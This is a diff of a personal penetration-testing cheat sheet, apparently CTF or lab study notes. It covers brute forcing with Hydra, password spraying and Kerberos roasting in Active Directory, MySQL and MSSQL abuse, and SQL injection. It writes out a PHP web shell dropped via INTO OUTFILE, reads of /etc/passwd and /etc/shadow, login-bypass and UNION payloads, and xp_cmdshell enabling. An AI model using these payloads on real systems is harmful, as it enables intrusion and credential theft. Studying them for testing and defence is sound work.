@@ -28,33 +28,136 @@
 
   - Re-Used (also local auth)
 
-- **Password Generation**
+### Wordlist Generation
 
-  - Web Applications    -> `pswgen [WEB_URL]`
-  - User Data                 -> `cupp -i` -> Input Data & Obtain Wordlist
-  - Wordlist Mutations
-    - Hashcat Mangling
-      - `/usr/share/hashcat/rules` -> Best64 / LeetSpeak / [Clem9669 Rules](https://github.com/clem9669/hashcat-rule/tree/master)
-      - `hashcat --stdout --rules-file [RULE_FILE] [PASS.txt] > [OUT]`
-    - Manually Change  -> Dates / ID Values / Timestamps 
-    - Password Policy    -> Character & Length Filtering
-    - [LDAP Harvesting](https://github.com/p0dalirius/pyLDAPWordlistHarvester?tab=readme-ov-file)   -> Requires valid LDAP Credentials
+- All **combinations** for a given charset
 
-- **Bruteforcing**
+  - ```bash
+    crunch <min_lenght> <max_lenght> <char_set> | tee wd.txt
+    ```
 
-  - Usernames
-    - `usergen() [FULL_NAMES.txt]`
-    - Wordlists:
-      - [Statistically Likely](https://github.com/insidetrust/statistically-likely-usernames) 
-      - `/usr/share/seclists/Usernames`  (Xato-Net / CIRT / `Names.txt`)
-    - Services though which usernames can be bruteforced
-      - SMTP / [OpenSSH < 7.7](https://github.com/Sait-Nuri/CVE-2018-15473) / Kerberos / [Solaris FTP](https://github.com/pentestmonkey/ftp-user-enum/blob/master/ftp-user-enum.pl) / Ident / Finger
-      - Web Login Responses (if in the response you get 'user doesn't exist)
-    
-  - Passwords
-    - Wordlists: `/usr/share/seclists/Passwords`
-    
-      Xato-Net / CIRT / Probable-V2 / Darkweb2017 / Rockyou
+  - ```bash
+    hydra -x <min_lenght>:<max_lenght>:<CHAR_SET>
+    ```
+
+- **Web** Applications    -> `pswgen [WEB_URL]`
+
+- **Usernames**
+
+  - `usergen() [FULL_NAMES.txt]`
+
+  - Wordlists:
+    - [Statistically Likely](https://github.com/insidetrust/statistically-likely-usernames) 
+    - `/usr/share/seclists/Usernames`  (Xato-Net / CIRT / `Names.txt`)
+
+  - Services though which usernames can be bruteforced
+    - SMTP / [OpenSSH < 7.7](https://github.com/Sait-Nuri/CVE-2018-15473) / Kerberos / [Solaris FTP](https://github.com/pentestmonkey/ftp-user-enum/blob/master/ftp-user-enum.pl) / Ident / Finger
+    - Web Login Responses (if in the response you get 'user doesn't exist)
+
+- **Passwords**
+
+  - `cupp -i`: insert info about a victim to generate a password list
+
+  - Wordlists: `/usr/share/seclists/Passwords`
+
+    Xato-Net / CIRT / Probable-V2 / Darkweb2017 / Rockyou
+
+### Wordlist Mutation
+
+- Hashcat Mangling
+
+  - `/usr/share/hashcat/rules` -> Best64 / LeetSpeak / [Clem9669 Rules](https://github.com/clem9669/hashcat-rule/tree/master)
+  - `hashcat --stdout --rules-file [RULE_FILE] [PASS.txt] > [OUT]`
+
+- Manually Change  -> Dates / ID Values / Timestamps 
+
+- Password Policy    -> Character & Length Filtering
+
+- [LDAP Harvesting](https://github.com/p0dalirius/pyLDAPWordlistHarvester?tab=readme-ov-file)   -> Requires valid LDAP Credentials
+
+- Shell:
+
+  ```bash
+  grep -E <regex> wd.txt > wd.txt
+  ```
+
+  - Minimum Lenght `'^.{8,}$'`
+
+  - At least one upper-case: `'[A-Z]'`
+  
+  - At least 2 special char: `'([!@#$%^&*].*){2,}'`
+
+### Brute Forcing
+
+- Usernames
+
+  - `usergen() [FULL_NAMES.txt]`
+  - Wordlists:
+    - [Statistically Likely](https://github.com/insidetrust/statistically-likely-usernames) 
+    - `/usr/share/seclists/Usernames`  (Xato-Net / CIRT / `Names.txt`)
+  - Services though which usernames can be bruteforced
+    - SMTP / [OpenSSH < 7.7](https://github.com/Sait-Nuri/CVE-2018-15473) / Kerberos / [Solaris FTP](https://github.com/pentestmonkey/ftp-user-enum/blob/master/ftp-user-enum.pl) / Ident / Finger
+    - Web Login Responses (if in the response you get 'user doesn't exist)
+
+- Passwords
+
+  - `cupp`: insert info about a victim to generate a password list
+
+  - Wordlists: `/usr/share/seclists/Passwords`
+
+    Xato-Net / CIRT / Probable-V2 / Darkweb2017 / Rockyou
+
+#### Hydra
+
+```bash
+# LOGIN OPTIONS						# Attack Options
+-l <user>							-t <n>		# Task count
+-L <user.txt>						-w <n>		# delay between attempts
+-p <pass>
+-P <pass.txt>
+
+# SERVICES
+service://server -s <port>
+-M targets.txt	# Multiple Ips 
+
+# WEB
+hydra [..] -f [IP] -s [PORT] http-get
+hydra [..] http-post-form "/PATH:user=^USER^&pass=^PASS^:[FILTER]"
+	# Filtering options:
+	S=<success_condition>
+	F=<failure_condition>	# Can be a status code or a word in the page
+```
+
+Supported services:
+
+- `ftp` The flag for the passive mode: `-m "PASV"`
+- `ssh`
+- `smtp`
+- `pop3`
+- `imap`
+- `mysql`
+- `mssql`
+- `vnc`
+- `rdp`
+
+## Encoding
+
+- Burpsuite intruder
+
+- [CyberChef](https://gchq.github.io/CyberChef/)
+
+- Terminal encoding
+
+  ```bash
+  cat [FILE.txt] | while read line; do echo -n $line | base64 | tr -d '\n' | base16; done
+  ```
+
+  - `echo -n` avoids the newline
+  - `tr -d '\n'` removes any newline characters from the input
+
+**Whatch out for bad characters at the end!** *It could me something went wrong*
+
+00, 0a, 0d, 90
 
 ## Hash Cracking
 
@@ -87,7 +190,7 @@
 Shadow hashes are typically stored in `/etc/shadow` and look like this:
 
 ```basic
-user:$6$randomsalt$hashedpassword:18323:0:99999:7:::
+user:$6$randomsalt$hashedpassword:18323:0:99999:7::::
 ```
 
 - `$6$`: Hashing algorithm (e.g., SHA-512).
@@ -100,7 +203,7 @@ Before cracking one has to unshadow, that is:
 
 ```bash
 unshadow /etc/passwd /etc/shadow > combined.txt
-john combined.txt
+john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt --fork=15
 john --show combined.txt
 ```
 
@@ -712,7 +815,19 @@ tftp
 | `status`     | Shows the current status of tftp, including the current transfer  mode (ascii or binary), connection status, time-out value, and so on. |
 | `verbose`    | Turns verbose mode, which displays additional information during file transfer, on or off. |
 
+### 79 - Finger
 
+**Finger** is a program you can use to find information about computer users. 
+
+#### Enumeration
+
+```bash
+finger @<Victim>       #List users
+finger admin@<Victim>  #Get info of user
+finger user@<Victim>   #Get info of user
+```
+
+Bruteforcing finger can reveal local users
 
 ### 110, 995 - POP3
 
@@ -772,7 +887,9 @@ By default, `POP3` clients remove downloaded messages from the email server, whi
 | `RSET`          | Requests the server to reset the transmitted information.   |
 | `QUIT`          | Closes the connection with the POP3 server.                 |
 
-​                          
+### 111 tu, Portmapper
+
+ 
 
 ### 111tu, 2049tu - NFS
 
@@ -865,6 +982,10 @@ By default, `POP3` clients remove downloaded messages from the email server, whi
   /usr/share/doc/python3-impacket/examples/wmiexec.py [USER]:"[PASSWD]"@[IP] "hostname"
   ```
 
+### 115 LPD Printer
+
+
+
 ### 135, 137-9, 445 - RPC, NetBIOS, SMB
 
 #### Generalities:
@@ -947,26 +1068,45 @@ By default, `POP3` clients remove downloaded messages from the email server, whi
   - `seq 500 1100` generates a sequence of numbers from 500 to 1100
   - `-c "queryuser 0x$(printf '%x\n' $i)"`: Executes the `queryuser` command to query information about a user by their RID (Relative Identifier)
 
+- `smbclient.py`
+
+  - Connect:
+  
+    `[[domain/]username[:password]@]<targetName or address>`
+  
+  - Interation:
+  
+    ```bash
+    # List shares
+    shares
+    # Use share
+    use <share>
+    # List files
+    ls
+    # Get file
+    get <file>
+    ```
+  
 - `smbclient`
 
   - `smbclient //[IP ADDRESS]{/FOLDER}`
     - `-N` anonymous access
     - `-U` specify user
   - `-L` display the list of shares (only to display without access!!)
-  
+
   - The ones accessible without authentication don't have the dollar sign `$`
-  
+
     - `cd`, `ls`, and to download a file `get`.
-  
-  
+
+
     - `!<cmd>` to execute local system commands without interrupting the connection
-  
-  
+
+
     - `smbstatus` shows the version and who, from which host, and which share the client is connected
-  
-  
+
+
     - `psexec` to open a shell
-  
+
 - `smbmap`
 
   ```bash
@@ -1185,6 +1325,11 @@ Values can be quoted to enclose spaces and special characters. A " must then be 
     A1 LOGOUT
 ```
 
+### 389, 636, 3268 LDAP
+
+1. nxc to get / verify credentials 
+2. 
+
 ### 161u - SNMP
 
 #### Generalities
@@ -1358,7 +1503,7 @@ rsync -av --list-only rsync://[IP]/[SHARE]
 
 - To copy: `rsync -av rsync://{HOST}/{module} [YOUR DIRECTORY]`
 
-### 1433 - msSQL
+### 1433 - MSSQL
 
 #### Generalities
 
@@ -1399,7 +1544,7 @@ rsync -av --list-only rsync://[IP]/[SHARE]
   If credentials are known:
 
   ```bash
-  mssqlclient.py [commonName]/[USER]@[IP] -windows-auth
+  mssqlclient.py [domain]/[USER]@[IP] -windows-auth
   ```
 
 - **Windows Authentication** 
@@ -1459,8 +1604,10 @@ enum_links
 use_link [NAME]
 
 # Execute commands (if enabled)
-xp_cmdshell 'whoami'
-# Enable xp_cmdshell (with appropriate privileges)
+xp_cmdshell "whoami"
+# Enable xp_cmdshell (with appropriate privileges) impacket:
+enable_xp_cmdshell
+# Enable from Windows:
 EXECUTE sp_configure 'show advanced options', 1
 RECONFIGURE
 EXECUTE sp_configure 'xp_cmdshell', 1
@@ -1662,7 +1809,130 @@ If the client does not specify a SID, the default value defined in the `tnsnames
   - Linux `/var/www/html`
   - Windows `C:\inetpub\wwwroot`
 
+### 3306 - MySQL
 
+#### Generalities
+
+**Type:** Database
+
+- Purpose:
+
+  - Open-source SQL relational database management system developed and supported by Oracle.
+  - The MySQL clients can retrieve and edit the data
+  - Ideally suited for applications such as *dynamic websites*
+  - A MySQL database translates the commands internally into executable code and performs the requested actions.
+
+- Structure:
+
+  - The data is stored in tables with different columns, rows, and data types.
+
+  - often stored in a single file with the file extension `.sql`
+
+#### Configuration
+
+`/etc/mysql/mysql.conf.d/mysqld.cnf`
+
+**Dangerous settings:**
+
+| **Settings**       | **Description**                                              |
+| ------------------ | ------------------------------------------------------------ |
+| `user`             | Sets which user the MySQL service will run as.               |
+| `password`         | Sets the password for the MySQL user.                        |
+| `admin_address`    | The IP address on which to listen for TCP/IP connections on the administrative network interface. |
+| `debug`            | This variable indicates the current debugging settings       |
+| `sql_warnings`     | This variable controls whether single-row INSERT statements produce an information string if warnings occur. |
+| `secure_file_priv` | This variable is used to limit the effect of data import and export operations. |
+
+- The entries of `user`,`password`, and `admin_address` are made in plain text
+- The `debug` and `sql_warnings` settings provide  verbose information output in case of errors, which often contains sensitive content
+
+#### Interaction
+
+- Linux: (try both logins)
+
+  ```bash
+  mysql -h [IP] -u root -p[PASSWD]
+  ```
+
+- Windows:
+
+  ```cmd
+  mysql.exe -u [USER] -p[PASS] -h [IP]
+  ```
+
+- `dbeaver` (multi platform app)
+
+The most important databases for the MySQL server are the `system schema` (`sys`) and `information schema`. The system schema contains tables, information, and metadata necessary  for management, see the [reference manual](https://dev.mysql.com/doc/refman/8.0/en/system-schema.html#:~:text=The mysql schema is the,used for other operational purposes) of MySQL. The information schema also contains metadata, but has less information than the previous one.
+
+```sql
+# ENUMERATION
+
+# Get version
+select version(); or select @@version;
+# Show all databases.
+show databases;
+# Select one of the existing databases.
+use <db>;
+# Show all available tables in the selected database.
+show tables;
+# Show the columns of a selected table.
+show columns from tabl;
+# Show everything in the desired table.
+select * from tabl {ORDER BY clumn};
+# Show everything in a table in another database.
+select * from other_db.tabl;
+# Search for a condition in the desired table (AND &&, OR ||", NOT !).
+SELECT * FROM tabl WHERE colum = "string";
+SELECT * FROM tabl WHERE clm LIKE 'admin%';		# starting with admin
+SELECT * FROM tabl WHERE clm LIKE 'admin---';	# "" of lenght +3
+
+# CHANGING VALUES
+
+# Insert a record in table
+INSERT INTO table_name VALUES (column1_value, column2_value, ...);
+# Update specific records based on conditions
+UPDATE table_name SET column1=newvalue1,... WHERE <condition>;
+
+
+```
+
+#### Exploits
+
+- SQL injection
+
+- **Write**
+
+  - [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys). 
+
+  - If connected to a web server:
+
+    - Check read/write privileges
+
+      ```bash
+      show variables like "secure_file_priv";
+      ```
+
+      - If empty, the variable has no effect, which is not a secure setting.
+      - If set to the name of a directory, the server limits import and export operations to work only with files in that directory.
+      - If set to NULL, the server disables import and export operations.
+
+    - Write a file in the webserver directory 
+
+      ```bash
+      SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+      ```
+
+    - Browse to the location where the file is and execute our commands.
+
+- **Read Local Files** (not allowed by default)
+
+  ```bash
+  select LOAD_FILE("/etc/passwd");
+  ```
+
+- **Authentication bypass v5.6.x**
+
+  The server takes longer to respond to an incorrect password than to a  correct one. Thus, repeatedly authenticate with the same  incorrect password, will work.
 
 ### 3389tu - RDP
 
@@ -1774,6 +2044,8 @@ nmap -p 3632 <ip> --script distcc-cve2004-2687 --script-args="distcc-exec.cmd='i
 evil-wirm -i [IP] -u [USER] -p [PASSWD]
 ```
 
+To upload /download files use `upload` and `download` in the winrm session. The file must be in the folder you used to connect to winrm.
+
 #### Exploit
 
 The password is stored as an hash,  one-way function that takes any amount of data and returns a fixed size value.
@@ -1787,116 +2059,6 @@ sudo responder -I tun0 -w -d
 it creates a fake shared folder in your network, that if it interacts with the attacked ip (e.g. through the parameter of a web page), will steal the password as an Hash.
 
 The responder IP has to be loaded as a shared folder, i.e. `//<IP>/somefile`, if we want to do RFI.
-
-### 3306 - MySQL
-
-#### Generalities
-
-**Type:** Database
-
-- Purpose:
-
-  - Open-source SQL relational database management system developed and supported by Oracle.
-  - The MySQL clients can retrieve and edit the data
-  - Ideally suited for applications such as *dynamic websites*
-  - A MySQL database translates the commands internally into executable code and performs the requested actions.
-
-- Structure:
-
-  - The data is stored in tables with different columns, rows, and data types.
-
-  - often stored in a single file with the file extension `.sql`
-
-#### Configuration
-
-`/etc/mysql/mysql.conf.d/mysqld.cnf`
-
-**Dangerous settings:**
-
-| **Settings**       | **Description**                                              |
-| ------------------ | ------------------------------------------------------------ |
-| `user`             | Sets which user the MySQL service will run as.               |
-| `password`         | Sets the password for the MySQL user.                        |
-| `admin_address`    | The IP address on which to listen for TCP/IP connections on the administrative network interface. |
-| `debug`            | This variable indicates the current debugging settings       |
-| `sql_warnings`     | This variable controls whether single-row INSERT statements produce an information string if warnings occur. |
-| `secure_file_priv` | This variable is used to limit the effect of data import and export operations. |
-
-- The entries of `user`,`password`, and `admin_address` are made in plain text
-- The `debug` and `sql_warnings` settings provide  verbose information output in case of errors, which often contains sensitive content
-
-#### Interaction
-
-- Linux: (try both logins)
-
-  ```bash
-  mysql -h [IP] -u root -p[PASSWD]
-  ```
-
-- Windows:
-
-  ```cmd
-  mysql.exe -u [USER] -p[PASS] -h [IP]
-  ```
-
-- `dbeaver` (multi platform app)
-
-The most important databases for the MySQL server are the `system schema` (`sys`) and `information schema`. The system schema contains tables, information, and metadata necessary  for management, see the [reference manual](https://dev.mysql.com/doc/refman/8.0/en/system-schema.html#:~:text=The mysql schema is the,used for other operational purposes) of MySQL. The information schema also contains metadata, but has less information than the previous one.
-
-```bash
-# Get version
-select version();
-# Show all databases.
-show databases;
-# Select one of the existing databases.
-use <database>;
-# Show all available tables in the selected database.
-show tables;
-# Show the columns of a selected table.
-show columns from <table>;
-# Show everything in the desired table.
-select * from <table>;
-# Search for string in the desired table.
-select * from <table> where <column> = "<string>";
-```
-
-#### Exploits
-
-- SQL injection
-
-- **Write**
-
-  - [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys). 
-
-  - If connected to a web server:
-
-    - Check read/write privileges
-
-      ```bash
-      show variables like "secure_file_priv";
-      ```
-
-      - If empty, the variable has no effect, which is not a secure setting.
-      - If set to the name of a directory, the server limits import and export operations to work only with files in that directory.
-      - If set to NULL, the server disables import and export operations.
-
-    - Write a file in the webserver directory 
-
-      ```bash
-      SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
-      ```
-
-    - Browse to the location where the file is and execute our commands.
-
-- **Read Local Files** (not allowed by default)
-
-  ```bash
-  select LOAD_FILE("/etc/passwd");
-  ```
-
-- **Authentication bypass v5.6.x**
-
-  The server takes longer to respond to an incorrect password than to a  correct one. Thus, repeatedly authenticate with the same  incorrect password, will work.
 
 ### 6379 - REDIS
 
@@ -1924,7 +2086,11 @@ There could be multiple DCs. A *trust escalation* is a privilege escalation in w
 
 *Forest* is the parent of a collection of machines that has the same hierarchy.
 
-1. Through anonymous or guest authentication, try to get access to
+1. `addhost [IP] [DOMAIN]` → `addhost [IP] [DC_HOSTNAME]` → Repeat for every domain
+
+   `krbconf()   [DOMAIN] [DC_NETBIOS_NAME]`           → [Add Multiple Domains](https://mayfly277.github.io/posts/GOADv2-pwning_part1/)
+
+2. Through anonymous or guest authentication, try to get access to
 
    - SMB
 
@@ -1932,39 +2098,66 @@ There could be multiple DCs. A *trust escalation* is a privilege escalation in w
 
    - LDAP
 
-2. Get a list of valid usernames
+3. Get a list of valid usernames:
 
-3. Password spraying
+   - `--users` in nxc for SMB and LDAP while authenticating
 
-   ```bash
-    nxc smb 10.10.10.161 -u user.txt -p user.txt --no-bruteforce
-   ```
+   - manually for RPC with `enumdomusers` and `querydispinfo`
 
-   ```bash
-    nxc smb 10.10.10.161 -u user.txt -p user.txt --no-bruteforce --local-auth
-   ```
+   - rid-bruting over SMB
 
-   ```bash
-   nxc smb 10.10.10.161 -u "" -p "" --pass-pol
-   ```
+     ```bash
+     nxc smb <IP> -u "" -p "" --rid-brute 10000
+     ```
+
+   - Kerberos brute-forcing over ldap
+
+     - Generate users: `usergen() [FULL_NAMES.txt]` 
+
+       Wordlists:[Statistically Likely](https://github.com/insidetrust/statistically-likely-usernames) / Seclists Xato-Net + `Names.txt`
+
+     - ```bash
+       kerbrute userenum -d [DOMAIN] [USERS.txt] --dc [DC_IP]
+       ```
+
+4. Password spraying
+
+   - Get password policy
+     - smb: `nxc --pass-pol`
+     - rpc `getdompwinfo`
+   - nxc:
+     - use `--continue-on-success` 
+     - `--no-bruteforce` to try user user
+     - test on all services
 
    
 
-4. Get a session in WinRM
+5. Get a session in WinRM
 
-5. If you cannot, Kerberos bruteforcing
+6. If you cannot, Kerberos Roasting: steal an hash
 
    ```bash
    GetNPUsers.py htb.local/ -usersfile user.txt -request -dc-ip 10.10.10.161 
    ```
 
-6. Dump and analyze the database
+7. Dump and analyze the database
 
    ```bash
-    bloodhound-python -u svc-alfresco -p s3rvice -ns 10.10.10.161 --domain htb.local -c All --zip --dns-tcp
+   neostart   # Open a Neo4J server
+   bloodhound # Open the bloodhound GUI 
+   bloodhound-python -u user -p pass -ns dc_ip --domain domain -c All --zip --dns-tcp
    ```
 
-   
+8. In bloodhung:
+
+   1. Upload
+   2. search for the user you compromised -> right click -> mark as owned
+   3. Outbound Object Control: click on everything
+   4. On the graph, click on the interessant edges
+   5. In Anlysis -> shortest path to High Value Targets
+
+
+
 
 ### NXC
 
@@ -1990,6 +2183,8 @@ Possible protocols:
 ```bash
 windapsearch -d htb.local --dc-ip 10.10.10.161 --users --full > users.txt
 ```
+
+Note that when `(Pwn3d!)` appears, it means that the user has admin access: either the user is in the Administrator group, or that you can easily escalate in AD because of domain-level privileges.
 
 ### Hash Dumping
 
@@ -2029,7 +2224,7 @@ Parameters are very important to spot, and they are grouped in different categor
 
   - Template Injection (SSTI / CSTI)
 
-  - XXS/HTML Injection 
+  - XSS/HTML Injection 
 
 - **FUNCTIONAL**: 
 
@@ -2052,18 +2247,14 @@ Parameters are very important to spot, and they are grouped in different categor
 
   - XXE
 
-`paramfuzz(query_url)` to fuzz get parameters
-
 ## Enumeration
 
-### Fingerprinting
+### Server Info
 
 - `web_enum [URL]`
-
 - Firefox Extensions:
   - Wappalyzer
   - RetireJS
-  
 - Page Content
 
   - Component Names / Versions
@@ -2085,17 +2276,26 @@ Parameters are very important to spot, and they are grouped in different categor
 
 ### Discovery
 
+#### FFUF
+
+```bash
+FILTER OPTIONS:
+  -fc              # HTTP status codes 
+  -fl              # lines in response.
+  -fr              # regexp
+  -fs              # response size. 
+  -fw              # amount of words in response.
+POST REQUESTS
+  -X POST -d 'PARAM1=value1&PARAM2=value2'		#same as curl
+```
+
+**REMEMBER TO COPY THE REQUEST EXACTLY!** E.g. from `Burp`
+
 #### VHosts
 
 - Purpose:
 
   A virtual host is a alternate, parallell hostname for your box that  allows your box to react differently depending on what alternate name  visitors aims at.  
-
-- Vhosts vs Subdomains:
-
-  - `Subdomains`: These are extensions of a main domain name (e.g., `blog.example.com` is a subdomain of `example.com`). `Subdomains` typically have their own `DNS records`, pointing to either the same IP address as the main domain or a  different one. They can be used to organise different sections or  services of a website.
-
-  - `Virtual Hosts` (`VHosts`): Virtual hosts are  configurations within a web server that allow multiple websites or  applications to be hosted on a single server. They can be associated  with top-level domains (e.g., `example.com`) or subdomains (e.g., `dev.example.com`). Each virtual host can have its own separate configuration, enabling precise control over how requests are handled.
 
 - Types:
 
@@ -2103,26 +2303,33 @@ Parameters are very important to spot, and they are grouped in different categor
   - IP-based
   - Port-based
 
-**Fuzzing**
-
-```bash
-vhost [URL]
-```
+**Fuzzing** `vhost URL` &rarr; Do it recursively!
 
 Add found subdomains to `/etc/hosts` and scan recursively
 
 #### Directories and files
 
-Fuzzing:
+Fuzzing: `dirfuzz [URL]`
 
-```bash
-dirfuzz [URL]
-```
+**HTTP status code** 
 
--  **HTTP status code** 
-   -  `200`  request was successful
-   -  `403`  forbidden to access the resource from the origin IP
-   -  `301`  being redirected (not a failure case)
+-  `200`  request was successful
+-  `403`  forbidden to access the resource from the origin IP
+-  `301`  being redirected (not a failure case)
+
+**IIS file/dir discovery**
+
+- General discovery: 
+
+  `/usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt`
+
+- Shortname scanner (`msfconsole`)
+
+  It returns file/dir name with the wildcards `*` and `*~1`, that have to be fuzzed
+
+- Extensions:
+
+  `/usr/share/wordlists/extension-wordlist/asp.net.txt`
 
 **Important files:**
 
@@ -2189,6 +2396,25 @@ dirfuzz [URL]
   git-dumper [URL] [OUTPUT DIR]
   ```
 
+#### Hidden parameters
+
+1. Check for hidden parameters:
+
+   `paramscan [URL]` 
+
+2. Verify the behaviour with curl
+
+3. Fuzz using `ffuf`: REMEMBER TO COPY THE REQUEST EXACTLY!
+
+```bash
+ffuf -X POST -d 'PARAM1=value1&PARAM2=value2'		#same as curl
+```
+
+There are different types of POST parameters formats, depending on the *content type*:
+
+- `Content-Type: application/x-www-form-urlencoded` &rarr; `-d 'PARAM=value'`
+- `Content-Type: application/json` &rarr; `-d "{'PARAM':'value'}"`
+-  `Content-type: multipart/form-data`
 
 #### Amazon Buckets
 
@@ -2221,6 +2447,16 @@ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
 - Linux: `"/etc/passwd"`
 - Windows file: `'file"///c:/windows/win.ini'`
 
+#### File Upload
+
+[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files)
+
+- Web Shell
+- Configuration Files:
+  - PHP: [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files/Configuration Apache .htaccess) 
+  - ASP: [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files/Configuration IIS web.config) 
+  - uWSGI: [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files/Configuration uwsgi.ini/uwsgi.ini) 
+
 #### OS File Read
 
 **Directory traversal:**
@@ -2243,27 +2479,180 @@ Windows:
 
 #### SQL Injections
 
-Each time the user wants to log in, the web application sends the log-in page input to the SQL Service, comparing it with stored database entries for that specific user. 
+**Injection types**:
 
- Post-log-in, the web application will set the user a special permission in the form of a cookie or authentication token that associates his online presence with his authenticated presence on the website. This cookie is stored both locally, on the user's browser storage, and the webserver.
+- **Union Based:** 
+  - output readable on the front-end
+  - specify location (i.e. column)
+- **Error Based:** 
+  - errors readable on the front-end
+- **Boolean Based** (blind)
+  - Boolean condition true &rarr; size or status change of HTML request
+- **Time Based** (blind)
+  - Boolean condition true &rarr; delay response with `Sleep()` &rarr; time change
+  - e.g. `AND 1=IF(2>1,SLEEP(5),0)`
+- **Stacked Queries**
+  -  injecting additional SQL statements after the vulnerable one. 
+  - e.g. `; DROP TABLE users`
+- **Out of Band:**
+  - output in a DNS record
 
-**Vulnerability:** 
+**Context:**
 
-- Add  `'#` in the parameter
+Relational database structure in the back-end (e.g. MySQL). *Relational databases* have data stored in tables and use SQL for queries
 
-- Use sqlmap to confirm th
+- Apache / Nginx &rarr; Problably running on Linux &rarr; likely `MySQL`
 
-  ```bash
-  sqlmap -u "http://[URL]?[QUERY]" -p [PARAM] search --dbs --level=5 --risk=3 --flush-session {--cookie=['COOKIE'] --dbms=[DATABASE]}```  
-  ```
+  - Identify with:
 
-  - A common database to try MySQL or PosrGreSQL for php applications
+    - If you have full query output: `SELECT @@version` 
 
-  - To run code execution
+      In MSSQL it returns MSSQL version. Error with other DBMS.
 
-    ```bash
-    sqlmap -u "http://[URL]?[QUERY]" -p [PARAM] search --dbs {--cookie=['COOKIE'] --dbms=[DATABASE]}--os-shell
+    - Numeric output: `SELECT POW(1,1)`
+
+      Error with other DBMS.
+
+    - Blind: `SELECT SLEEP(5)`
+
+      Will not delay response with other DBMS
+
+  - Use `INFORMATION_SCHEMA` to get the structure of the database
+
+    ```sql
+    cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- 
     ```
+
+    ```sql
+    cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- 
+    ```
+
+    ```sql
+    cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- 
+    ```
+
+- IIS &rarr; Probably Windows &rarr; likely `MSSQL`
+
+**sqlmap:** 
+
+- [Wiki & Usage](https://github.com/sqlmapproject/sqlmap/wiki/usage) 
+- In Net Inspector: `Copy` > `Copy Request Headers`
+- `sqlscan <query.txt>`
+
+```bash
+# General query
+sqlmap [CURL_QUERY]	/ -r [query.txt] 			# Test all parameters
+sqlmap [CURL_QUERY] -p [PARAM_TO_TEST]
+sqlmap [CURL_QUERY + APPEND * TO PARAM TO TEST]
+
+# Header
+-H='<HEADER_KEY>: <VALUE>'		# Header specification
+--<header_key>='<value>'		# Add * to test for injection
+
+# Good to have
+--dump-all --exclude-sysdbs		# Automatically dump all the data
+--flush-session --fresh-queries	# Clean prev sessions
+--threads 10
+
+# Payload tuning
+--prefix= / --suffix=				# Boundaries of the payload
+--level=<1-5 [d1]> 				# Extends payloads based on success prob
+--risk=<1-3 [d1]>				# Extends payloads based on risk
+
+--code=<status_code>			# Filter by status code of success
+--titles=<http_title>
+--string=<success_string>
+--text-only 					# Comparison only on visible content
+--technique=BEU
+
+-union-cols=<No.DB columns>		# For UNION Inj
+--union-char='a'				# Value of the column (default NULL)
+--union-from=<table>			# append in the form FROM <table>	
+
+# Security measures
+--random-agent 					#random User-agent 
+--mobile 						# imitate a smartphone
+
+# Error Handling
+--parse-errors						# Show DBMS errors
+-t /tmp/traffic.txt					# Stores traffic content
+--proxy	"http://127.0.0.1:9999"		# redirect to a proxy (Burp)
+```
+
+How to discover prefix:
+
+```bash
+ffuf -u [URL] param=[WorkingParam][Payload] -w /usr/share/wordlists/sql_prefix.txt:FUZZ1 -w /usr/share/wordlists/sql_suff.txt:FUZZ2
+```
+
+- PAYLOAD
+
+  - UNION: `ORDER BY FUZZN` 
+
+    wordlist: `/usr/share/wordlists/numbers1-20.txt:FUZZN`
+
+  - `OR 1=1` (check URL encoding, e.g. substitute ` ` with `+`)
+
+  - Sleep query: 
+    - MSSQL: `OR WAITFOR DELAY '0:0:10'`
+      - PSQL: `OR SELECT pg_sleep(10)`
+      - MYSQL: `OR SELECT sleep(10)`
+      - ORACLE: `OR dbms_pipe.receive_message(('a'),10)`
+
+
+**MYSQL:**
+
+- **Login Bypass**
+
+  `random' or 1=1-- -` or `random' or 1=1-- -`
+
+- **Union Injection**
+
+  in SQL merges the columns of two tables (use junk variables to match the number of columns)
+
+   `cn' UNION select 1,@@version,3,4-- `
+
+- **Read / Write Files:**
+
+  - Determine User
+
+    ```sql
+    SELECT USER()
+    SELECT CURRENT_USER()
+    SELECT user from mysql.user
+    ```
+
+  - Determine r/w privileges (`FILE` privilege)
+
+    ```sql
+    cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- 
+    ```
+
+  - Check where to r/w from (empty = anywere; NULL = nowhere)
+
+    ```sql
+    SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
+    ```
+
+  - Read
+
+    ```sql
+    SELECT LOAD_FILE('/etc/passwd');
+    ```
+
+    Read the server configuration to discover the **web root** (to upload a shell)
+
+    - Apache: `/etc/apache2/sites-enabled/000-default.conf`
+
+  - Write in the back-end
+  
+    ```sql
+    SELECT * from tabl INTO OUTFILE 'PATH'; 	# From Table
+    SELECT 'string' INTO OUTFILE 'PATH';		# From string
+    # If used with union do select 1, 2, 'string', ...
+    ```
+    
+    Use `FROM_BASE64("base64_data")` to write long files
 
 #### LFI / RFI
 
@@ -2400,6 +2789,47 @@ Before trying for a shell, it is good practice to **verify code execution**:
 | `Nginx`    | /usr/local/nginx/html/ |
 | `IIS`      | c:\inetpub\wwwroot\    |
